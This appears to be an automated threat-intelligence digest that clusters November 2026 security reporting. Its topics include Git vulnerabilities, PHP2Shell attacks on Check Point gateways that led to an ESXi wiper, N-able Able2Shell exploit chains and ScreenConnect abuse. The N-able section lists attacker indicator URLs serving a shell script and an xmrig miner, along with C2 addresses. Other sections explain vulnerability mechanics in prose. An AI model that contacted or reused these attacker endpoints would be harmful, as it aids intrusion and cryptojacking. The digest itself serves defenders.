GhostFrame’s implant uses a distinctive connection strategy to communicate with its C2 server. Rather than relying on a single des
```

#### Corroborating sources (2)

- **Recorded Future** (threat_research_primary)
  - Title: GhostFrame: A new ESXi Implant Linked to Settra Ransomware
  - Published: 2026-11-10T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/ghostframe-esxi-implant-settra-ransomware
  - Summary: GhostFrame is a new post-exploitation framework targeting VMware ESXi environments, linked to TAG-218 and Settra ransomware.
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Check Point gateways hacked via PHP2Shell to deploy VMware ESXi wiper
  - Published: 2026-11-13T16:21:43+00:00
  - Link: https://www.bleepingcomputer.com/news/security/check-point-gateways-hacked-via-php2shell-to-deploy-vmware-esxi-wiper/
  - Summary: Vulnerable Check Point Security Gateway instances have been targeted in PHP2Shell attacks that deployed data-wiping malware on VMware ESXi hosts. [...]

### Cluster 7d41d4d72e — score 16

- Title: Git security vulnerabilities announced
- Source: GitHub Security Lab (offensive_vulnerability_research)
- Published: 2026-11-10T18:00:00+00:00
- Link: https://github.blog/open-source/git/git-security-vulnerabilities-announced-7/
- Fetch status: ok
- Member count: 6
- Corroborating source count: 6
- Strong signals: GitHub

#### Cluster taxonomy (union across members)
- threat_categories: ddos, supply_chain
- affected_products: GitHub
- cve_ids: CVE-2026-105437, CVE-2026-111760, CVE-2026-113408, CVE-2026-114467, CVE-2026-114469
- content_type: news_report
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- threat_categories: ddos
- affected_products: GitHub
- cve_ids: CVE-2026-111760, CVE-2026-113408, CVE-2026-114467, CVE-2026-114469, CVE-2026-105437
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Git is releasing updates addressing six security vulnerabilities affecting recursive clones, reference handling, merges, binary patches, and imports. Here is what users need to know. The post Git security vulnerabilities announced appeared first on The GitHub Blog .
```

#### Full body

```
Elijah Newren · @newren November 10, 2026 | 5 minutes Share: Today, the Git project is releasing new versions to address six security vulnerabilities. These include arbitrary code execution when recursively cloning a malicious repository, writes to unintended files, and memory corruption when processing merges or binary patches. The fixes are included in Git 2.56.1 , with backports to Git 2.55.1, 2.54.1, 2.53.1, 2.52.1, 2.51.3, and 2.50.2. We recommend updating to Git 2.56.1 or the patched release for your maintenance series, and updating any applications that bundle Git. Vulnerabilities in Git CVE-2026-111760: Code execution during recursive clones Git checks paths before writing files into a working tree, including rejecting paths that would overwrite its own repository metadata. However, an integer truncation in Git’s index handling can cause an extremely long path to pass validation under one name and then be written using a shorter name. An attacker can use this discrepancy to replace a submodule’s .git file with a symbolic link pointing to a directory containing malicious configuration or hooks . When Git subsequently uses that directory, it can execute attacker-controlled code during a recursive clone. The fix rejects extremely long index entry paths before their lengths can be truncated. [ Advisory ] CVE-2026-113408: Path traversal through a server’s advertised HEAD When cloning an empty repository using Git protocol v2, the server can advertise a HEAD symref pointing to an unborn branch (one that has no commits yet). Git did not validate the symref’s target before storing it locally. A malicious server can supply a name containing path-traversal components. With the files reference backend, a later operation that updates the branch can write outside the intended reference directory. Git now validates the advertised target before accepting it. The release also validates other reference names and symbolic-reference targets received through protocol v2. [ Advisory ] CVE-2026-114467: Stack corruption when removing signatures When stripping GPG signatures from a message, Git assumed there would be at most two signatures. A specially crafted message containing more than two signatures can cause Git to write past the end of a fixed-size stack array. This can be triggered by merging a tag containing more than two signatures, causing memory corruption and a potential denial of service. Hosting services that perform these merges on behalf of users can also be affected. The fix removes the fixed-size array and handles messages with any number of signatures. [ Advisory ] CVE-2026-114469: Out-of-bounds reads when applying binary patches Git rejects patches larger than approximately 1 GiB because its patch application code cannot safely handle larger inputs. However, this check only considered the size of the patch as supplied. Binary patches are compressed and encoded, so a relatively small patch can expand beyond that limit. A crafted patch can bypass the input-size check and cause an out-of-bounds read, crashing Git. Git now also checks the declared uncompressed size before processing a binary patch. [ Advisory ] CVE-2026-105437: Heap corruption during large merges Git’s merge machinery calculates how much memory it needs for a merge result before writing the output. That calculation can overflow when the result is very large, including when many conflicts are combined with a large conflict-marker-size attribute. The overflow can cause Git to allocate a buffer that is too small, then write outside it, corrupting heap memory. This affects applications and hosting services that use Git to merge untrusted content, as well as local merges. The fix uses size-appropriate types and checked arithmetic, rejecting merges whose output size cannot be represented safely. [ Advisory ] CVE-2026-114466: Filesystem access through fast-import streams git fast-import reads a stream of commands to build a repository. Some commands can access files
```

#### Corroborating sources (6)

- **GitHub Security Lab** (offensive_vulnerability_research)
  - Title: Git security vulnerabilities announced
  - Published: 2026-11-10T18:00:00+00:00
  - Link: https://github.blog/open-source/git/git-security-vulnerabilities-announced-7/
  - Summary: Git is releasing updates addressing six security vulnerabilities affecting recursive clones, reference handling, merges, binary patches, and imports. Here is what users need to know. The post Git security vulnerabilities announced appeared first on The GitHub Blog .
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Don't just flag it, fix it: How to run CodeMender in your pull requests
  - Published: 2026-11-10T17:00:00+00:00
  - Link: https://cloud.google.com/blog/products/identity-security/how-to-run-codemender-in-your-pull-requests/
  - Summary: As many developers use agentic tools to create more code faster than ever before, the code has gotten more complex and they’re taking longer to find and fix software flaws. Helping to address that pressure is a key concern at Google. We know that software development velocity is increasing, as much as 2x for some teams , and the average developer fix time for software flaws expanded from approximately 59 days a decade ago to more than 170 days in 2025, according to the Mandiant M-Trends 2026 Report . CodeMender: AI powered vulnerability fixes right in GitHub PRs To help you secure more code, more quickly, we’ve built CodeMender, our autonomous code-security agent that can find and fix software flaws at machine speed. We also know that developer tools only succeed if they fit into existing routines. That’s why CodeMender, part of our AI Threat Defense platform , brings automated code fixes directly into the developer workflow. Today, we’re sharing this reference architecture that wires
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: New Supply Chain Attack Compromises Tens of Thousands of GitHub Repositories
  - Published: 2026-11-09T14:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/supply-chain-attack-thousands/
  - Summary: Security researchers have detected a malicious workflow affecting tens of thousands of GitHub repositories, including Uber-owned ones
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Hackers compromise 4,800 GitHub accounts to steal cloud credentials
  - Published: 2026-11-12T22:25:30+00:00
  - Link: https://www.bleepingcomputer.com/news/security/hackers-compromise-4-800-github-accounts-to-steal-cloud-credentials/
  - Summary: A new campaign dubbed 'wfx-loot' has unfolded on GitHub where threat actors used 4,837 compromised accounts to probe 61,764 repositories, open pull requests, and push secrets-stealing malware. [...]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attacker Used 4,837 Hijacked GitHub Accounts to Run a CI Secret Stealer in 1,806+ Repositories
  - Published: 2026-11-12T06:42:47+00:00
  - Link: https://thehackernews.com/2026/11/4837-hijacked-github-accounts-ran-ci.html
  - Summary: Starting Tuesday, an attacker used stolen credentials for 4,837 GitHub accounts to plant a secret stealer in repositories those accounts could write to, according to Aikido Security, a security software company. The stealer is built to take the secrets and cloud credentials that a repository's CI workflows can reach. It ran in at least 1,806 repositories, where the attacker has likely collected
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - Title: Nearly 4,837 GitHub accounts hijacked in major supply-chain attack
  - Published: 2026-11-12T15:48:41+00:00
  - Link: https://www.reddit.com/r/cybersecurity/comments/1xug7z5/nearly_4837_github_accounts_hijacked_in_major/
  - Summary: Aikido Security reports that attackers used stolen credentials for 4,837 GitHub accounts to plant malicious code in repositories. The code was designed to steal secrets and cloud credentials accessible through automated build and testing workflows. Researchers observed malicious execution in at least 1,806 repositories. A separate SafeDep analysis counted 8,093 repositories receiving malicious commits, using a different measurement. These figures are not necessarily directly comparable. The attacks began November 10, and the full scope is still being investigated. Even legitimate GitHub projects can become dangerous when a contributor account is compromised. Attackers may steal credentials without requiring end users to download or execute malware. https://www.aikido.dev/blog/compromised-github-accounts-push-ci-secret-stealer-to-tens-of-thousands-of-repositories submitted by /u/BTC-brother2018 [link] [comments]

### Cluster 2cab26404c — score 15

- Title: PHP2Shell Exploitation on Check Point Gateway
- Source: Check Point Research (threat_research_primary)
- Published: 2026-11-12T13:56:37+00:00
- Link: https://research.checkpoint.com/2026/php2shell-exploitation-on-check-point-gateway/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-109618

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, web_shell_backdoor
- actor_attribution: UNC5221
- affected_industries: financial_services
- affected_products: Android, Ivanti, Palo Alto Networks
- cve_ids: CVE-2026-109618, CVE-2026-109619, CVE-2026-123039
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, web_shell_backdoor
- actor_attribution: UNC5221
- affected_industries: financial_services
- affected_products: Ivanti, Android, Palo Alto Networks
- cve_ids: CVE-2026-109618, CVE-2026-123039, CVE-2026-109619
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Key findings Introduction We have now confirmed that, in late October 2026, approximately one week after a security fix became available, activity originating from 130.94.19[.]204 targeted Israeli organizations through vulnerable Mobile Access portals on Check Point Security Gateways. Evidence suggested some cases of a successful compromise, with exploitation activity consistent with PHP2Shell, associated with CVE-2026-109618 […] The post PHP2Shell Exploitation on Check Point Gateway appeared first on Check Point Research .
```

#### Full body

```
CATEGORIES AI Research 23 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 482 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 433 How To Guides 13 Ransomware 6 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 PHP2Shell Exploitation on Check Point Gateway November 12, 2026 https://research.checkpoint.com/2026/php2shell-exploitation-on-check-point-gateway/ Key findings Beginning on 30 October 2026, an attacker executed scanning and exploitation activity against organizations with unpatched Check Point Security Gateways, using Mobile Access portals with PHP2Shell as initial access followed by CVE-2026-123039. The first wave, on October 30, targeted Israeli organizations and included destructive activity against some of them. A broader second wave on November 2 targeted organizations across multiple countries and sectors, with no evidence of destructive activity In the investigated intrusion, PHP2Shell provided initial access, followed by privilege escalation through the DynamicCLI interface, tracked as CVE-2026-123039. The attackers then deployed PHP webshells, the persistent TSGA backdoor and its embedded TSProxy networking component. The attackers pivoted from the gateway to a VMware ESXi host over SSH, deployed the destroy_v6 wiper, and left politically themed DREAM_ANNEXATION.txt notes during the destructive stage. TSGA and TSProxy are modified variants of PhiliKit, a malware framework previously documented in attacks exploiting Ivanti vulnerabilities. Both tools share distinctive code, configuration, and cryptographic material with the framework Although ESET associated PhiliKit with China nexus UNC5221, the evidence does not allow us to assess with high confidence the true nature of this operation. Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen. The note left during the destructive activity uses the Dream Security brand. Dream had recently published research on PHP2Shell exploitation of Palo Alto Networks devices by China nexus actors. While this timing raises the possibility of retaliation, the available evidence does not establish a clear motive. Introduction We have now confirmed that, in late October 2026, approximately one week after a security fix became available, activity originating from 130.94.19[.]204 targeted Israeli organizations through vulnerable Mobile Access portals on Check Point Security Gateways. Evidence suggested some cases of a successful compromise, with exploitation activity consistent with PHP2Shell, associated with CVE-2026-109618 and CVE-2026-109619. Following initial access, the attacker escalated privileges from the portal service account to root by exploiting CVE-2026-123039 , a local privilege-escalation vulnerability in the DynamicCLI IPC interface. The attacker then used privileged command execution to deploy PHP webshells and establish persistence. A second scanning wave on November 2 nd targeted some Israeli organizations previously targeted during the first wave, alongside additional organizations worldwide, with no apparent focus on Israel. Neither wave showed a clear sector preference, suggesting opportunistic initial-access attempts rather than sector-specific targeting. Infection Flow On October 30, 2026, the first signs of exploitation appeared on the targeted Check Point Mobile Access gateways. PHP session artifacts were created under /opt/CPcvpn-R81.20/tmp/, including session files containing the upload_progress_pwn marker associated with the exploitation activity. During the same window, the portal’s Apache/PHP workers experienced hundreds of segmentation faults, providing additional evidence of repeated exploitatio
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: PHP2Shell Exploitation on Check Point Gateway
  - Published: 2026-11-12T13:56:37+00:00
  - Link: https://research.checkpoint.com/2026/php2shell-exploitation-on-check-point-gateway/
  - Summary: Key findings Introduction We have now confirmed that, in late October 2026, approximately one week after a security fix became available, activity originating from 130.94.19[.]204 targeted Israeli organizations through vulnerable Mobile Access portals on Check Point Security Gateways. Evidence suggested some cases of a successful compromise, with exploitation activity consistent with PHP2Shell, associated with CVE-2026-109618 […] The post PHP2Shell Exploitation on Check Point Gateway appeared first on Check Point Research .

### Cluster b481567219 — score 13

- Title: N-able Disables Cloud Services Following Disclosure of "Able2Shell" Exploit Chains
- Source: Huntress (detection_response_operations)
- Published: 2026-11-09T21:00:00+00:00
- Link: https://www.huntress.com/blog/n-able-disables-cloud-services-following-disclosure-of-able2shell-exploit-chains
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Anthropic/Claude, GitHub, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: GitHub, OpenAI/ChatGPT, Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
UPDATE: N-able took N-central offline after 33 critical flaws were disclosed, including chains enabling remote code execution and privilege escalation.
```

#### Full body

```
Home Blog N-able Disables Cloud Services Following Disclosure of "Able2Shell" Exploit Chains Published: November 9, 2026 N-able Disables Cloud Services Following Disclosure of "Able2Shell" Exploit Chains By: Lindsey O'Donnell-Welch Susannah Matt Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways On November 9, N-able took N-central hosted environments offline after a security researcher disclosed 33 critical vulnerabilities in the server-side application for the remote monitoring and management platform. The vulnerabilities were found and published to GitHub by an independent researcher, and can lead to at least four distinct exploit chains resulting in remote code execution or privilege escalation on impacted N-able N-central servers, running N-central Appliance 2026.4.0.31 (and likely earlier versions as well). On November 10, N-able released N-central 2026.4 HF2 , (build 2026.4.1.26) to address the Able2Shell vulnerabilities disclosed the day before, stating that all hosted servers had been upgraded and brought back online. N-able said it has not seen active exploitation of the vulnerabilities. On November 11, the researcher behind Able2Shell published two more sets of exploit code for N-able N-central. "4EverAble2Shell" and "Agent2Shell." N-able has since stated that the N-central server issue described depends on a non-default configuration, where the Legacy API is turned on and exposed to the public internet, UPDATE: 11/13 @ 10:25 AM ET In an update to its security advisory on November 13 at 13:40:25 UTC, N-able said that it has identified Indicators of Compromise (IoCs) for customers that haven't disabled the Legacy API. Here are the IoCs they have released: URLs hxxp://157.20.241[.]16:8080/jup.sh hxxp://157.20.241[.]16:8080/xvgz hxxp://157.20.241[.]16:8080/xmrig.tgz hxxp://157.20.241[.]16:8080/ob/cronhit?h=jup_start_<rig>&persist=<method> hxxp://157.20.241[.]16:8080/ob/fcheck Outbound Traffic 157.20.241[.]16 (ports 8080, 19202 to 19418 ) 139.99.69[.]109:10128 79.76.51[.]56:39100 Additionally, N-able confirmed that Agent2Shell exploitation (like 4EverAble2Shell) requires the non-default Legacy API to be enabled. As of this writing, Huntress has not observed exploitation of these issues in our partners' environments. We are continuing to track this incident and will continue updating this blog as new information emerges. UPDATE: 11/12 @ 6:30 AM ET New information from N-able changes our guidance from earlier this morning. N-able has released an active advisory addressing this latest set of exploits. In its advisory, N-able said that the N-central server issue described depends on a non-default configuration, where the Legacy API is turned on and exposed to the public internet. N-able released a knowledge base article on how to disable Legacy API settings on on-premises N-central servers . N-able is not advising customers to take N-central offline. The author of the exploit code has since updated their repository to confirm the exploit only works with Legacy API turned on. Servers running 2026.4 HF2 with Legacy API disabled are not exposed to this exploit chain. What should you do right now? On-premises N-central: confirm that Legacy API is disabled. If it is enabled, follow N-able's article to disable it. If you need Legacy API enabled, do not expose it to the internet . Restrict access to the server until N-able provides a fix. If you took your server offline based on our earlier update, confirm Legacy API is disabled before bringing it back online. Hosted N-central: N-able states that hosted environments are not vulnerable to this issue. If Legacy API was enabled and reachable from the internet, review server and endpoint activity from November 11 onward using the indicators in our earlier update below. We have not yet confirmed whether the Agent2Shell chains affecting Windows Agents and Probes also depend on Legacy API. We are working with N-able to clarify this and will update this post whe
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: N-able Disables Cloud Services Following Disclosure of "Able2Shell" Exploit Chains
  - Published: 2026-11-09T21:00:00+00:00
  - Link: https://www.huntress.com/blog/n-able-disables-cloud-services-following-disclosure-of-able2shell-exploit-chains
  - Summary: UPDATE: N-able took N-central offline after 33 critical flaws were disclosed, including chains enabling remote code execution and privilege escalation.

### Cluster 864c66af33 — score 12

- Title: N-able issues advisory on critical vulnerabilities
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-11-10T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/n-able-issues-advisory-on-critical-vulnerabilities
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- urgency_signals: actively_exploited, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: active_exploitation
- urgency_signals: actively_exploited, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Categories: Threat Research Tags: advisory, N-able
```

#### Full body

```
N-able issues advisory on critical vulnerabilities Written by Sophos X-Ops Threat Research advisory N-able Share This Link Copied On November 9, 2026, a security researcher released a series of proof-of-concept (PoC) scripts targeting various vulnerabilities in N-able's N-central platform. The collection of PoCs claims to exploit several critical weaknesses in the N-central platform. As a result, N-able has taken the precautionary step of taking their N-central Hosted Environments offline. At this time there is third-party reporting suggesting that exploitation is occurring in the wild. N-Able’s advisory does not indicate that they have observed exploitation as of this writing; however they do note that they have observed scanning activity associated with the published PoC code. At this time, Sophos X-Ops has not observed exploitation . We recommend that operators of on-premises N-central servers follow N-able’s advice. Recommended actions Sophos X-Ops recommends that organizations review N-able’s advisory and monitor it for further instructions from N-able. Sophos countermeasures SophosLabs continues to monitor the threat landscape for activity related to this threat and will deliver detections and protections as available. About the Author(s) Sophos X-Ops Representing a powerful evolution in cyber defense, Sophos X-Ops is a joint task force of multiple specialized teams, purpose-built to address the growing complexity of today’s cyberthreat landscape.
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: N-able issues advisory on critical vulnerabilities
  - Published: 2026-11-10T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/n-able-issues-advisory-on-critical-vulnerabilities
  - Summary: Categories: Threat Research Tags: advisory, N-able

### Cluster e8815d20df — score 12

- Title: IT threat evolution in Q3 2026. Non-mobile statistics
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-11-10T08:00:37+00:00
- Link: https://securelist.com/malware-report-q3-2026-pc-iot-statistics/121843/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Apple iOS/macOS

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, data_breach, ransomware_extortion
- affected_products: Apple iOS/macOS, Palo Alto Networks, SonicWall
- cve_ids: CVE-2025-60710, CVE-2026-0257, CVE-2026-15409, CVE-2026-15410, CVE-2026-45659
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_government, tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, data_breach, active_exploitation
- affected_products: Palo Alto Networks, SonicWall, Apple iOS/macOS
- cve_ids: CVE-2026-0257, CVE-2026-15409, CVE-2026-15410, CVE-2026-45659, CVE-2025-60710
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Key trends and statistics on malware targeting Windows and macOS computers and Internet of Things (IoT) devices in Q3 2026.
```

#### Full body

```
Content menu Close Subscribe Threat Response Table of Contents Quarterly figures Ransomware Quarterly trends and highlights Threat actor disruption Vulnerabilities and attacks The most prolific groups Number of new ransomware variants Number of users attacked by ransomware Trojans TOP 10 countries and territories attacked by ransomware Trojans TOP 10 most common families of ransomware Trojans Miners Number of new miner variants Number of users attacked by miners TOP 10 countries and territories attacked by miners Attacks on macOS Quarterly highlights TOP 20 threats to macOS TOP 10 countries and territories by share of attacked users IoT threat statistics Distribution by protocol TOP 10 threats delivered to IoT devices Attacks on IoT honeypots Attacks via web resources TOP 10 countries and territories that served as sources of web-based attacks Countries and territories where users faced the greatest risk of online infection Local threats Countries and territories where users faced the highest risk of local infection Authors AMR IT threat evolution in Q3 2026. Non-mobile statistics IT threat evolution in Q3 2026. Mobile statistics The statistics in this report are based on detection verdicts returned by Kaspersky products unless otherwise stated. The information was provided by Kaspersky users who consented to sharing statistical data. Quarterly figures In Q3 2026: Kaspersky products blocked more than 311 million attacks launched from online resources. Web Anti-Virus responded to 47 million unique links. File Anti-Virus blocked more than 23 million malicious and potentially unwanted objects. There were 4470 new ransomware variants discovered. More than 81,000 users experienced ransomware attacks. 15% of all ransomware victims whose data was published on threat actors’ data leak sites (DLSs) were victims of Qilin. More than 217,000 users were targeted by miners. Ransomware Quarterly trends and highlights Threat actor disruption In August, the creator and lead administrator of the Ransom Cartel ransomware-as-a-service (RaaS) operation was sentenced to 16 years in prison. The convict developed the ransomware Trojan and at the time of his arrest played a central role in the RaaS operation: running the affiliate program, recruiting affiliates, supplying them with information and attack tools, working with initial access brokers, communicating with victims, and processing payments. In September, a member of the Ryuk RaaS group was sentenced to two years in prison and three years of supervised release. In 2019 and 2020, he and his accomplices breached organizations’ networks and encrypted data with the Ryuk Trojan. According to public reports, hundreds of workstations and servers were compromised. According to the prosecution, the attacker received a total of about 1610 BTC in ransom payments from victims. Also in September, a member of the Conti RaaS group was sentenced to four years in prison. He was charged with attacking companies in 2021 and 2022. In addition to carrying out attacks, he developed part of the group’s malware toolkit. Vulnerabilities and attacks In July, researchers published a report on the Qilin group exploiting the CVE-2026-0257 vulnerability in Palo Alto Networks firewall software. The vulnerability allowed attackers to bypass authentication and compromise victims’ networks without valid accounts. CISA published information in its Known Exploited Vulnerabilities Catalog (KEV) on several CVEs actively exploited by ransomware groups: CVE-2026-15409 / CVE-2026-15410 in SonicWall SMA1000 remote access gateways. CISA doesn’t specify which groups exploited these vulnerabilities, but researchers have linked this activity to INC Ransom. CVE-2026-45659 in Microsoft SharePoint Server allowed an authenticated, low-privileged attacker to achieve remote code execution. CVE-2025-60710 in Microsoft Windows allowed attackers to escalate privileges locally. CVE-2026-59310 in VMware vCenter enabled unauthenticated remote code ex
```

#### Corroborating sources (2)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: IT threat evolution in Q3 2026. Non-mobile statistics
  - Published: 2026-11-10T08:00:37+00:00
  - Link: https://securelist.com/malware-report-q3-2026-pc-iot-statistics/121843/
  - Summary: Key trends and statistics on malware targeting Windows and macOS computers and Internet of Things (IoT) devices in Q3 2026.
- **SANS Internet Storm Center** (government_authoritative)
  - Title: Macfinger ClickFix campaign sends DownTheDRAIN infostealer for macOS, (Fri, Nov 13th)
  - Published: 2026-11-13T03:41:41+00:00
  - Link: https://isc.sans.edu/diary/rss/33518
  - Summary: Introduction

### Cluster b4cc660673 — score 12

- Title: Attackers use Crypto Exchange Names to Disguise Unauthorized Sessions on 100+ ScreenConnect Servers
- Source: Huntress (detection_response_operations)
- Published: 2026-11-14T01:50:00+00:00
- Link: https://www.huntress.com/blog/fake-crypto-exchange-sessions-screenconnect
- Fetch status: ok
- Member count: 6
- Corroborating source count: 4
- Strong signals: ScreenConnect

#### Cluster taxonomy (union across members)
- affected_industries: financial_services
- affected_products: ScreenConnect
- cve_ids: CVE-2026-84869
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_industries: financial_services
- affected_products: ScreenConnect
- cve_ids: CVE-2026-84869
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Fake crypto exchange sessions are showing up on ScreenConnect servers and could be bait for technicians. See what Huntress found and what to do.
```

#### Full body

```
Home Blog Attackers use Crypto Exchange Names to Disguise Unauthorized Sessions on 100+ ScreenConnect Servers Published: November 13, 2026 Attackers use Crypto Exchange Names to Disguise Unauthorized Sessions on 100+ ScreenConnect Servers By: John Hammond Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways After being tipped off by one of our MSP partners, Huntress investigated a cluster of unauthorized guest sessions appearing on ScreenConnect panels from machines with crypto exchange-themed names. As of November 13, we've seen related activity across at least 118 self-hosted ScreenConnect servers belonging to 109 Huntress-protected organizations. In total, we found 2,408 unauthorized sessions enrolled since November 3, 2026. The unauthorized sessions came from machines with names like KUCOIN-SRV and LAPTOP-BINANCE . They come from a scripted emulator that impersonates a Windows ScreenConnect client, and nearly all of them had connected from a single IONOS-hosted IP, 74.208.158[.]106 . Notably, we haven't seen evidence of any sort of malicious activity linked to these sessions: they haven't pushed files, run commands, or sent anything to technicians who joined them, and joining them hasn't triggered anything so far. However, we assess that these sessions could still be risky to organizations, or used as bait to launch an attack. A separate campaign is actively exploiting a critical ScreenConnect flaw (CVE-2026-84869), which lets a malicious guest make a vulnerable technician client run a file. A tempting "crypto server" is exactly the kind of session a technician might open. MSPs should update every technician's ScreenConnect client to 26.6.5 or later, check for and delete the fake sessions if they exist, and check whether anyone joined one. Background On November 12, 2026, an MSP asked us about a handful of unfamiliar machines in their self-hosted ScreenConnect console. Named after various crypto exchanges, the machines had no apparent company or owner and claimed to be online. Nobody at the MSP had installed them. The MSP's server itself was clean. We found no evidence of web shells, suspicious child processes, or new accounts. The sessions were real entries in the server's database, though, so we turned the question around: If one server had these guests, how many others did? We collected the ScreenConnect session database ( App_Data\Session.db ) from the Huntress-protected ScreenConnect servers we could reach and looked for the same pattern. As of this writing, we've found 2,223 fake sessions on 118 servers across 109 MSP and organization accounts. These unauthorized sessions have been added over the course of the past 10 days. Across our telemetry, we could see the first session was enrolled November 3, and the latest one was enrolled November 13. Huntress has investigated various incidents involving ScreenConnect in the last few months: including rogue ScreenConnect installations seen in September and, most recently, activity linked to the SCKit worm on November 11. We haven't found any overlap between the crypto-bait fakes and the published SCKit indicators. Figure 1: An overview of the unauthorized sessions found What do these unauthorized sessions look like? ScreenConnect is remote desktop software that many MSPs host on their own servers. Technicians connect to customer computers using a host client, and each customer computer runs a guest client. In an unattended "Access" session, a guest can stay registered in the server's console even when no technician is connected, appearing in the session list of computers available for access. Figure 2: Example list of unauthorized sessions in ScreenConnect (image courtesy of Reddit ). Someone is registering unauthorized guest computers on MSPs' servers, where they sit in these session lists. In the console, each one looks like an always-online computer with a crypto-exchange name and a thumbnail of what appears to be a trading desktop. Figure 3: a c
```

#### Corroborating sources (4)

- **Huntress** (detection_response_operations)
  - Title: Attackers use Crypto Exchange Names to Disguise Unauthorized Sessions on 100+ ScreenConnect Servers
  - Published: 2026-11-14T01:50:00+00:00
  - Link: https://www.huntress.com/blog/fake-crypto-exchange-sessions-screenconnect
  - Summary: Fake crypto exchange sessions are showing up on ScreenConnect servers and could be bait for technicians. See what Huntress found and what to do.
- **Sophos X-Ops** (detection_response_operations)
  - Title: Malicious ScreenConnect deployments observed
  - Published: 2026-11-11T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/malicious-screenconnect-deployments-observed
  - Summary: Categories: Threat Research Tags: advisory, connectwise, ScreenConnect
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: SCKit Malware Turns ScreenConnect Support Sessions Into Potential MSP Attack Paths
  - Published: 2026-11-12T13:08:28+00:00
  - Link: https://thehackernews.com/2026/11/sckit-malware-targets-screenconnect.html
  - Summary: The ongoing campaign targeting ConnectWise ScreenConnect deployments involves the exploitation of a now-patched critical security flaw in the remote access software, and not a new vulnerability, it has emerged. Blackpoint Cyber's Adversary Pursuit Group (APG), which shared the details with The Hacker News, said the recovered attacker toolkit exploits CVE-2026-84869 (CVSS score: 9.9), an
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: New worm-like 'SCKit' malware targets MSPs in ScreenConnect attacks
  - Published: 2026-11-12T22:53:10+00:00
  - Link: https://www.bleepingcomputer.com/news/security/new-worm-like-sckit-malware-targets-msps-in-screenconnect-attacks/
  - Summary: A new worm-like malware toolkit named SCKit was deployed in the recent ScreenConnect attacks targeting managed service providers (MSPs), designed to spread from infected customer devices to MSP technicians' computers and compromise additional managed networks. [...]

### Cluster 656ea1ba73 — score 11

- Title: SCKit abuses ScreenConnect to deploy remote access and target technician sessions
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-11-13T21:31:44+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/11/13/sckit-abuses-screenconnect-deploy-remote-access-target-technician-sessions/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft
- affected_products: Microsoft Defender, ScreenConnect
- tools_used: Microsoft Defender, ScreenConnect
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: credential_theft
- affected_products: Microsoft Defender, ScreenConnect
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
SCKit abuses ScreenConnect to deploy unauthorized remote access and target technicians. Explore the attack chain, mitigations, and Microsoft Defender XDR hunting. The post SCKit abuses ScreenConnect to deploy remote access and target technician sessions appeared first on Microsoft Security Blog .
```

#### Full body

```
